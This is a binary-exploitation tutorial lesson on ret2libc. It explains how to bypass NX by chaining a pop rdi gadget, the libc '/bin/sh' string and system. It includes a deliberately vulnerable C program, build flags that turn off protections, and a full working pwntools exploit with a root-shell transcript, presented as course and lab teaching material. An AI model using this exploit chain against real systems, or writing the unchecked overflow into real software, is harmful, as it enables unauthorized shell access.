---
title: "Lesson 6.1: ret2libc, calling system when NX is on"
image:
  path: /assets/img/covers/pwn-6-1-ret2libc-calling-system-nx.webp
  alt: "ret2libc, calling system when NX is on"
date: 2022-11-26 07:18:00 +0700
categories: ["Binary Exploitation", "Pwn · ret2libc and ROP"]
tags: [pwn, ret2libc, rop]
render_with_liquid: false
---

NX blocks running shellcode on the stack, but it does not block calling code that already exists. ret2libc is the first move in code-reuse thinking: instead of loading new code, we borrow libc's `system` and make it run `/bin/sh`.

![A ret2libc chain: pop rdi, /bin/sh, system](/assets/img/pwn/pwn-6-1-ret2libc-calling-system-nx.svg)
_A pop rdi gadget loads the /bin/sh pointer into rdi, then control falls straight into system._

Part: 6 (ret2libc and ROP) | Time: about 60 minutes reading plus lab | Difficulty: medium

**Prerequisites:** Lesson 3.2 (offset to saved RIP), Lesson 3.3 (pop rdi gadget), Lesson 1.2 (System V calling convention), Lesson 5.1 (NX).

**Tools:** pwntools, gdb + pwndbg, ROPgadget, checksec.

## Goals

By the end of this lesson you understand why NX does not stop ret2libc. You can set up an argument for `system` through rdi following the System V calling convention. You can find the address of `system` and of the string `/bin/sh` inside libc. You can chain a complete ret2libc payload and handle alignment.

## 1. Theory

### Why NX does not stop this

NX (No-eXecute) marks the stack as non-executable, so jumping into shellcode on the stack is deadly. But libc already sits in an executable region of the process, and libc contains `system`, a function that takes a command string and runs it through `/bin/sh -c`. If we control saved RIP (through a buffer overflow), we can make it return straight into the start of `system`, with its argument set to the address of the string `/bin/sh`. That gets us a shell without writing a single byte of new code. The name ret2libc means "return to libc."

### Passing the argument: rdi and the calling convention

On x86-64 Linux, the System V calling convention passes the first six integer arguments through registers, in order: rdi, rsi, rdx, rcx, r8, r9. `system` only needs one argument, so we only need to load rdi with the address of the string `/bin/sh`.

But an overflow only lets us write onto the stack, it does not set a register directly. That is where a gadget comes in: a short existing instruction sequence, in the binary or in libc, ending in `ret`. The gadget we need is `pop rdi ; ret`: it takes the next 8 bytes on the stack, puts them in rdi, then `ret`s to whatever is next. This mechanism is the foundation of ROP (Lesson 6.3), here we use just one simple link of it.

The chain on the stack, read from saved RIP upward, looks like this.

```
[ saved RIP  ] -> address of the gadget: pop rdi ; ret
[ +8 ]         -> address of the string "/bin/sh"   (gets popped into rdi)
[ +16 ]        -> address of system
```

When the vulnerable function `ret`s, it jumps into the gadget. The `pop rdi` gadget consumes the `/bin/sh` slot into rdi, then its `ret` jumps on into `system`. By this point rdi is already correct, and `system("/bin/sh")` runs.

### Finding system and /bin/sh

Both addresses live inside libc, and there are two situations.

- If the binary is no-PIE and is statically linked, or libc happens to sit at a fixed address (rare in real challenges), or if ASLR is off, you can take the address directly.
- In practice with ASLR on: you must leak the libc base first (Lesson 6.2), then add the offsets of `system` and of the string `/bin/sh`. This lesson focuses on the chain mechanism itself, so we demo it with ASLR off (or with a known libc base) for simplicity, and leave leaking to Lesson 6.2.

With pwntools, once you have a libc object (and its base), every offset is looked up automatically.

```python
libc = ELF('./libc.so.6')
libc.address = leaked_base              # after leaking, Lesson 6.2
system   = libc.sym['system']
binsh    = next(libc.search(b'/bin/sh\x00'))
```

The offsets of `system`, of the `/bin/sh` string, and of any gadget inside libc depend tightly on the libc version, so DO NOT hardcode them. The right approach: load the exact libc file of the target and let pwntools look up offsets, then once you have the base everything is correct automatically. Two versions illustrate how different they are: on glibc 2.35 (Ubuntu 22.04) the `/bin/sh` string sits at file offset 0x1d8678 and a `pop rdi ; ret` at 0x2a3e5; while on glibc 2.39 (Ubuntu 24.04, build `GLIBC 2.39-0ubuntu8.9`) the offsets are `system` at 0x58750, `/bin/sh` at 0x1cc42f, `pop rdi ; ret` at 0x10c08d. Getting the version wrong throws every offset off, so always compute them dynamically from the actual target libc.

### Where the pop rdi gadget comes from

Older binaries often have `pop rdi ; ret` inside `__libc_csu_init`. Newer binaries (gcc 11 and later) no longer have that csu code, so a small, self-compiled program sometimes has no `pop rdi ; ret` at all. Two ways out: take the gadget from libc itself (once you have the libc base), or use practice sets (like ROP Emporium) that come with a gadget built in. You can find it this way.

```bash
ROPgadget --binary ./vuln | grep 'pop rdi ; ret'
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep ': pop rdi ; ret$'
```

## 2. Demo

Environment: Ubuntu 24.04, glibc 2.39, gcc 13.3 (verified to run for real, see the Lab section below).

Source `ret2libc.c`.

```c
#include <stdio.h>
#include <unistd.h>
void vuln(){ char buf[64]; read(0, buf, 256); }
int main(){ setvbuf(stdout, 0, 2, 0); vuln(); return 0; }
```

Build with NX on (default), no-PIE so the program's code has a fixed address, and no canary to keep it simple.

```bash
# -fcf-protection=none: gcc 13 inserts endbr64 (CET) by default, which breaks some gadgets; turn it off to keep things clean
gcc -fno-stack-protector -no-pie -fcf-protection=none -o ret2libc ret2libc.c
checksec --file=ret2libc     # NX enabled, No PIE, No canary
```

To keep the demo focused on the chain itself without also dealing with leaking, we take the libc base of our own child process through pwntools (`io.libc.address`, read from `/proc/<pid>/maps`). For a LOCAL process this is correct even with ASLR on, so there is no need for `setarch`. Against a real remote target (where you cannot read the target's maps), you have to leak, which is the job of Lesson 6.2. If you want a fixed address to inspect in gdb, you can run with ASLR off.

```bash
setarch $(uname -m) -R ./ret2libc     # optional: run with ASLR off for a stable address to inspect
```

Find the offset to saved RIP with cyclic this way.

```python
from pwn import *
context.binary = ELF('./ret2libc')
io = process('./ret2libc')
io.send(cyclic(200))
io.wait()
core = io.corefile
offset = cyclic_find(core.read(core.rsp, 8))   # distance to saved RIP
log.info(f'offset = {offset}')                 # with buf[64] this usually comes out to 72
```

Here is the full ret2libc script (ASLR off, libc base taken from the process map, or use `libc.address` once you have leaked it).

```python
from pwn import *

elf  = context.binary = ELF('./ret2libc')
libc = elf.libc                      # pwntools knows which libc this binary links against
io   = process('./ret2libc')

# with ASLR off, or once you have leaked it: set the libc base
libc.address = io.libc.address       # take the real libc base of this process (ASLR off)
log.info(f'libc base = {hex(libc.address)}')

offset  = 72                          # VERIFY THIS YOURSELF with cyclic
rop     = ROP([elf, libc])
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]        # to align the stack
binsh   = next(libc.search(b'/bin/sh\x00'))
system  = libc.sym['system']

payload = flat(
    b'A' * offset,
    ret,            # one ret gadget to align rsp to a multiple of 16 before entering system
    pop_rdi, binsh,
    system,
)
io.send(payload)
io.interactive()
```

A few lines are worth explaining.

- `rop.find_gadget(['pop rdi', 'ret'])` finds the `pop rdi ; ret` gadget. If the binary is too small to have one, pwntools looks inside libc too, because we passed `ROP([elf, libc])`.
- The `ret` gadget right before the chain is there for alignment. Modern glibc's `system` uses SSE instructions like `movaps` that need rsp to be a multiple of 16; if it is off by 8 bytes (which commonly happens after a ROP chain), you get an immediate SIGSEGV inside `system`. Adding one extra `ret` shifts rsp by 8 bytes to fix that.
- `libc.search(b'/bin/sh\x00')` finds the existing string inside libc, no need to plant a string anywhere yourself.

Against a real remote target you cannot read the target's `/proc/<pid>/maps`, so `io.libc.address` is useless there, that is when you have to leak the libc base, see Lesson 6.2.

Here is the real output from running the exploit script in the Lab section below on Ubuntu 24.04 (glibc 2.39), one run (the libc address changes each time due to ASLR).

```
[*] libc base = 0x700b2f200000
[*] pop rdi ; ret = 0x700b2f30c08d       # base + 0x10c08d, taken from libc
[*] system        = 0x700b2f258750       # base + 0x58750
[*] /bin/sh       = 0x700b2f3cc42f        # base + 0x1cc42f
===PWNED_6_1===
uid=0(root) gid=0(root) groups=0(root)
Linux ubuntu24 6.8.0-134-generic ... x86_64 GNU/Linux
===END===
[+] ret2libc OK: got a shell and ran id
```

## 3. Lab

- Task: the binary described in the Lab section below, NX on, no-PIE, no canary, has an overflow through `read`.
- Goal: get a shell with ret2libc. Build the ASLR-off version first to understand the chain, then think about what you would need to leak with ASLR on.
- Hints, in steps:
  - Hint 1: find the offset to saved RIP with cyclic.
  - Hint 2: you need `pop rdi ; ret`, the address of `/bin/sh`, and the address of `system`. If the binary lacks the gadget, take it from libc.
  - Hint 3: crashing inside `system`? That is alignment, insert a `ret` before the chain.
- Check yourself: can you name the exact three things ret2libc needs (a gadget to set rdi, a string, a function) and explain why NX does not block any of them?
- A verified solution exists with full source, build script, exploit, and transcript in the Lab section below (run for real on Ubuntu 24.04, glibc 2.39, got a root shell).

## 4. Key takeaways

- NX does not block code-reuse, libc's `system` can still be called.
- rdi carries the first argument, set with the `pop rdi ; ret` gadget.
- Three components: a gadget to set rdi, the address of `/bin/sh`, the address of `system`.
- Add one extra `ret` to align rsp to 16 bytes before entering `system`.
- With ASLR on, you have to leak the libc base first (Lesson 6.2).

## 5. Common pitfalls

- Forgetting alignment. The chain looks correct but SIGSEGVs right at the start of `system` inside `movaps`. Add a `ret` gadget to put rsp back on a multiple of 16. This is the single most common ret2libc pitfall on modern glibc.
- Newer binaries missing `pop rdi ; ret`. gcc 11 dropped `__libc_csu_init`, removing that familiar gadget. Take it from libc instead, once you have the base.
- Hardcoding a libc address while ASLR is on. It works fine inside gdb (ASLR off) and fails outside it. Always test outside gdb, several times.
- Forgetting the null terminator of `/bin/sh`. Search for `/bin/sh\x00` so the string ends correctly, otherwise `system` receives a longer string than intended.
- Using libc offsets from the wrong version. The offsets of `system` and `/bin/sh` are tightly tied to the libc version, always look them up on the exact target libc.

## 6. Further reading

- Lesson 6.2 to leak the libc base and identify the libc version (libc-database).
- Lesson 6.3 to see that ret2libc is just a special case of ROP.
- The System V AMD64 ABI, the section on passing arguments through registers.
- The ret2libc challenge on pwnable.kr, and the split/callme challenges on ROP Emporium (Lesson 6.4).

## Lab

<div class="lab-box">
<div class="lab-head"><b>LAB 6.1</b>Download the lab files</div>
<div class="lab-files">
<a class="lab-file lab-all" href="/assets/labs-pwn/6.1.zip" download><i class="fa-solid fa-file-zipper"></i>Download all (.zip)</a>
<a class="lab-file" href="/assets/labs-pwn/6.1/build.sh" download><i class="fa-solid fa-file-code"></i>build.sh</a>
<a class="lab-file" href="/assets/labs-pwn/6.1/exploit.py" download><i class="fa-solid fa-file-code"></i>exploit.py</a>
<a class="lab-file" href="/assets/labs-pwn/6.1/src.c" download><i class="fa-solid fa-file-code"></i>src.c</a>
</div>
</div>
